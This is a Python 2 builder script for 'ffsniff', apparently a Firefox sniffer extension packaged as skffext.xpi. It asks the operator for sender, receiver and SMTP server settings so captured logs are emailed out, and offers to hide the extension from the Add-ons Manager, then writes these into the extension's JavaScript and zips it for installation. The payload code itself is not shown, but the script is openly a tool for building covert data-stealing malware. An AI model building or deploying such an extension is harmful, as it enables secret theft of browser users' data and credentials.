#!/usr/bin/env python
# This is a really very simple script.
# GNU GPL (v2 only)

import zipfile
from os import remove

try:
	print ""

	# default settings
	send_from_host = ""
	send_from = ""
	send_to = ""
	subject = "skffext log"
	smtp_host = "localhost"
	smtp_port = "25"
	enable_hide = "yes"

	print "The file with name 'skffext.xpi' will be created in current working"
	print "directory. Any existing file with this name will be overwritten."
	print ""

	print "What will be the sender host name ? (will be used is EHLO command)"
	temp_var = raw_input("[%s]: " % send_from_host)
	if temp_var != "":
		send_from_host = temp_var
	print "What will be the sender e-mail address ?"
	temp_var = raw_input("[%s]: " % send_from)
	if temp_var != "":
		send_from = temp_var
	print "What will be the receiver e-mail address ?"
	temp_var = raw_input("[%s]: " % send_to)
	if temp_var != "":
		send_to = temp_var
	print "What will be the subject of e-mail ?"
	temp_var = raw_input("[%s]: " % subject)
	if temp_var != "":
		subject = temp_var
	print "What will be the host of mail server ?"
	temp_var = raw_input("[%s]: " % smtp_host)
	if temp_var != "":
		smtp_host = temp_var
	print "What will be the port of mail server ?"
	temp_var = raw_input("[%s]: " % smtp_port)
	if temp_var != "":
		smtp_port = temp_var
	print "Enable hidding in Extension/Add-ons Manager ? [yes/no]"
	temp_var = raw_input("[%s]: " % enable_hide)
	if temp_var != "":
		enable_hide = temp_var.lower()
	print ""

	print "Updating ffsniffOverlay.js.."
	file_obj = open("src/chrome/content/ffsniff/ffsniffOverlay_orig.js", "r")
	code = file_obj.read()
	file_obj.close()
	code = code.replace("<SEND_FROM_HOST>", send_from_host)
	code = code.replace("<SEND_FROM>", send_from)
	code = code.replace("<SEND_TO>", send_to)
	code = code.replace("<SUBJECT>", subject)
	code = code.replace("<SMTP_HOST>", smtp_host)
	code = code.replace("<SMTP_PORT>", smtp_port)
	code = code.replace("<HIDDING>", enable_hide)
	file_obj = open("src/chrome/content/ffsniff/ffsniffOverlay.js", "w")
	file_obj.write(code)
	file_obj.close()

	print "Creating ffsniff.jar.."
	file = zipfile.ZipFile("ffsniff.jar", "w")
	file.write("src/chrome/content/ffsniff/contents.rdf", "content/ffsniff/contents.rdf", zipfile.ZIP_DEFLATED)
	file.write("src/chrome/content/ffsniff/ffsniffOverlay.js", "content/ffsniff/ffsniffOverlay.js", zipfile.ZIP_DEFLATED)
	file.write("src/chrome/content/ffsniff/ffsniffOverlay.xul", "content/ffsniff/ffsniffOverlay.xul", zipfile.ZIP_DEFLATED)
	file.close()

	print "Creating skffext.xpi.."
	file = zipfile.ZipFile("skffext.xpi", "w")
	file.write("src/install.rdf", "install.rdf", zipfile.ZIP_DEFLATED)
	file.write("src/chrome.manifest", "chrome.manifest", zipfile.ZIP_DEFLATED)
	file.write("ffsniff.jar", "chrome/ffsniff.jar", zipfile.ZIP_DEFLATED)
	file.close()

	print "Removing ffsniff.jar.."
	remove("ffsniff.jar")
except KeyboardInterrupt:
	print "Aborted"
